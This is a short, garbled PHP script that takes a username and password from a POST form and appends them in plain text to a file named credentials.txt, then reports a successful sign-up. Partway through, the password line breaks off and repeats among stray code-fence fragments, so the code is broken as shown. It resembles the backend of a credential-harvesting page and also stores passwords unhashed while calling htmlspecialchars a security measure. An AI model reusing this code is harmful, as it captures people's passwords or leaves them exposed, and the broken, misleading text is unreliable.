<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the username and password from the form
    $username = $_POST['username'];
    $password = $_POST```php
    $```php
    $password = $_POST['password'];

    // Sanitize input to prevent security issues
    $username = htmlspecialchars($username);
    $password = htmlspecialchars($password);

    // Save the credentials to a file
    $file = 'credentials.txt';
    $handle = fopen($file, 'a'); // Open the file in append mode
    if ($handle) {
        fwrite($handle, "Username: $username, Password: $password\n");
        fclose($handle);
        echo "Sign up successful! You can now log in.";
    } else {
        echo "Error saving credentials.";
    }
} else {
    echo "Invalid request method.";
}
?>
